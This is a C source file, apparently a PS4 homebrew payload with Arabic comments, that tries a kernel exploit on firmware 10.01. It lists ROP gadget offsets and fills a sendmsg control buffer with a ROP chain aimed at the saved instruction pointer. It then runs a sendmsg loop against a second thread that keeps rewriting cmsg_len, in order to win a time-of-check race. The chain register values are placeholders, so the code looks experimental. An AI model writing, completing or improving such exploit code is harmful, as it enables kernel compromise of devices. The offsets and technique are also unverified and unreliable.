#include <ps4.h>

// الإزاحات لنسخة 10.01 (قائمة الأوفستات التي وفرتها)
#define OFF_POP_RAX_RET          0x29974f 
#define OFF_POP_RDI_RET          0x510c4e 
#define OFF_POP_RSI_RET          0x2983e0 
#define OFF_POP_RDX_RET          0x4029b2 
#define OFF_POP_RCX_RET          0x2983ba 
#define OFF_POP_R8_POP_RBP_RET   0x37dd7d 
#define OFF_PUSH_RSP_POP_RSI_RET 0xbb3ee6 

struct msghdr {
    void *msg_name; uint32_t msg_namelen; void *msg_iov; int msg_iovlen;
    void *msg_control; uint32_t msg_controllen; int msg_flags;
};
struct cmsghdr { uint32_t cmsg_len; int cmsg_level; int cmsg_type; };

#define CONTROL_LEN 256
uint8_t control_buf[CONTROL_LEN];
struct cmsghdr *cmsg;
int global_sock;

// بناء الـ Payload باستهداف المنطقة الحساسة في المكدس
void build_targeted_payload(uint64_t kbase) {
    uint64_t pop_rax    = kbase + OFF_POP_RAX_RET;
    uint64_t pop_rdi    = kbase + OFF_POP_RDI_RET;
    uint64_t pop_rsi    = kbase + OFF_POP_RSI_RET;
    uint64_t pop_rdx    = kbase + OFF_POP_RDX_RET;
    uint64_t pop_rcx    = kbase + OFF_POP_RCX_RET;
    uint64_t pop_r8_rbp = kbase + OFF_POP_R8_POP_RBP_RET;
    uint64_t jump_target = kbase + OFF_PUSH_RSP_POP_RSI_RET;

    memset(control_buf, 0, CONTROL_LEN);
    cmsg = (struct cmsghdr *)control_buf;
    cmsg->cmsg_level = 0; 
    cmsg->cmsg_type = 7; 
    cmsg->cmsg_len = 0x50;

    // السلسلة المنظمة لملء السجلات بـ 64-بت (Quad-word)
    uint64_t chain[] = {
        pop_rax,    0x1111111111111111, // RAX
        pop_rdi,    0x2222222222222222, // RDI
        pop_rsi,    0x3333333333333333, // RSI
        pop_rdx,    0x4444444444444444, // RDX
        pop_rcx,    0x5555555555555555, // RCX
        pop_r8_rbp, 0x8888888888888888, // R8
                    0xBBBBBBBBBBBBBBBB, // RBP المحفوظ
        jump_target                     // RIP المستهدف
    };

    /* تكتيك "المنطقة الذهبية": 
       بما أن r12 ظهر سابقاً عند إزاحة معينة، سنضع السلسلة 
       بدءاً من 0x40 لنغطي المنطقة التي تسبق وتلي r12.
    */
    for (int i = 0x40; i < 0xB0; i += sizeof(chain)) {
        if (i + sizeof(chain) < CONTROL_LEN) {
            memcpy(control_buf + i, chain, sizeof(chain));
        }
    }
}

void *sendmsg_thread(void *arg) {
    (void)arg;
    struct msghdr msg = {0};
    msg.msg_control = control_buf;
    msg.msg_controllen = CONTROL_LEN;
    while(1) { 
        syscall(28, global_sock, &msg, 0); 
    }
    return NULL;
}

void *race_thread(void *arg) {
    (void)arg;
    while(1) {
        cmsg->cmsg_len = 0x50;
        // تأخير مجهري لزيادة احتمالية نجاح السباق في المسار الصحيح
        for(volatile int i=0; i<50; i++); 
        cmsg->cmsg_len = 0xFFFF; 
    }
    return NULL;
}

int _main(struct thread *td) {
    (void)td;
    initKernel();
    initLibc();

    uint64_t kbase = get_kernel_base();
    build_targeted_payload(kbase);

    global_sock = syscall(97, 2, 2, 0);
    if (global_sock < 0) return -1;

    ScePthread t1, t2;
    scePthreadCreate(&t1, NULL, sendmsg_thread, NULL, "thr_sendmsg");
    scePthreadCreate(&t2, NULL, race_thread, NULL, "thr_race");

    scePthreadJoin(t1, NULL);
    scePthreadJoin(t2, NULL);

    return 0;
}
